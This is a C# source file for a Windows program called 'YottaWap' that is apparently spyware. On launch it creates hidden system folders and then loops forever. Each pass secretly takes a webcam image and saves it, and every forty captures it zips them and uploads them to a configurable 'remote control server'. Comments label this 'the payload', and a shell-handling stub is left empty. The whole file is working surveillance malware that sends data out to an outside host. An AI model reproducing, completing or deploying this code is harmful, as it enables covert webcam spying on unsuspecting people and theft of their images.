using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Windows;
using Emgu.CV;
using Ionic.Zip;

namespace YottaWap
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
            ExecuteCode();
        }

        string remoteControlServer = "Your server here.";

        public enum ErrorCodes
        {
            DirCreationError0x01 = 1,
            DirCreationError0x02 = 2,
            DirCreationError0x03 = 3,
            DirCreationSuccess = 4,
            GetVideoCapError = 5,

        }

        void ExitWithError(ErrorCodes err)
        {
            Environment.Exit((int)err);
        }


        ErrorCodes CreateDirs()
        {
            string currentDir = Directory.GetCurrentDirectory();
            string programDir;
            if (Directory.Exists(currentDir))
            {
                DirectoryInfo di = Directory.CreateDirectory(currentDir + "/YottaWap");
                di.Attributes = FileAttributes.Directory | FileAttributes.Hidden | FileAttributes.System; // | FileAttributes.System;
                if (Directory.Exists(currentDir + "/YottaWap"))
                {
                    programDir = currentDir + "/YottaWap";
                }
                else
                {
                    return ErrorCodes.DirCreationError0x01;
                }
            }
            else
            {
                return ErrorCodes.DirCreationError0x02;
            }
            string[] dirsToCreate = { "Videos", "Keys", "Audio", "Other", "Data", "Data/Captures", "Logs" };
            foreach (string dir in dirsToCreate)
            {
                DirectoryInfo di = Directory.CreateDirectory(programDir + "/" + dir);
                di.Attributes = FileAttributes.Directory | FileAttributes.Hidden | FileAttributes.System; // | FileAttributes.System;
                if (!Directory.Exists(programDir + "/" + dir))
                {
                    return ErrorCodes.DirCreationError0x03;
                }
            }
            return ErrorCodes.DirCreationSuccess;
        }

        VideoCapture? GetVideoCap()
        {
            VideoCapture cap = new VideoCapture(0);
            return cap;
        }

        void WriteError(string mainPath, Exception ex)
        {
            string dataToAppend = "[ " + DateTime.Now.ToString() + " ], " + ex.ToString() + "\n";
            File.AppendAllText(mainPath + "Logs/Errors.txt", dataToAppend);
        }
        void WriteLog(string mainPath, string msg)
        {
            string dataToAppend = "[ " + DateTime.Now.ToString() + " ], " + msg + "\n";
            File.AppendAllText(mainPath + "Logs/Logs.txt", dataToAppend);
        }

        int EnterLoop(string mainPath, VideoCapture cap)
        {
            int i = 0;
            string sessionPrefix = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10);
            int uploadEvery = 40;
            while (true)
            {
                try
                {
                    // This is the payload \\

                    // Capture Image
                    cap = new VideoCapture(0);
                    Mat image = new Mat();
                    cap.Read(image);
                    cap.Dispose();
                    image.Save(mainPath + "Data/Captures/capture-" + i.ToString() + "-" + sessionPrefix + ".jpg");

                    //Handel Shell



                    i++;

                    // Handel image uploading
                    if ((i % uploadEvery) == 0)
                    {
                        string[] files = Directory.GetFiles(mainPath + "Data\\Captures\\");
                        List<string> filesToUpload = new List<string>();
                        foreach (string file in files)
                        {
                            string[] parts = file.Split('\\').Last().Split("-");

                            if (int.Parse(parts[1]) <= i && (int.Parse(parts[1]) >= (i-uploadEvery)))
                            {
                                if (parts[2].Substring(0, 10) == sessionPrefix)
                                {
                                    filesToUpload.Add(file);
                                }
                            }
                        }
                        if (filesToUpload.Count == 0)
                        {
                            continue;
                        }

                        File.WriteAllLines(mainPath + "FileOutput.txt", filesToUpload.ToArray());

                        using (ZipFile zip = new ZipFile())
                        {
                            zip.AddFiles(filesToUpload ,"/");
                            zip.Save(mainPath + "CapturesToUpload.zip");
                        }

                        WebClient Client = new WebClient();

                        Client.Headers.Add("Content-Type", "binary/octet-stream");
                        byte[] result = Client.UploadFile(remoteControlServer, mainPath + "CapturesToUpload.zip");

                        string s = Encoding.UTF8.GetString(result, 0, result.Length);
                        WriteLog(mainPath, s);
                    }
                }
                catch (Exception ex)
                {
                    WriteError(mainPath, ex);
                    i++;
                }
            }
        }
        void ExecuteCode()
        {
            ErrorCodes dirMadeSuccess = CreateDirs();
            if (dirMadeSuccess != ErrorCodes.DirCreationSuccess)
            {
                ExitWithError(dirMadeSuccess);
            }

            EnterLoop(Directory.GetCurrentDirectory() + "\\YottaWap\\", null);

        }
    }
}
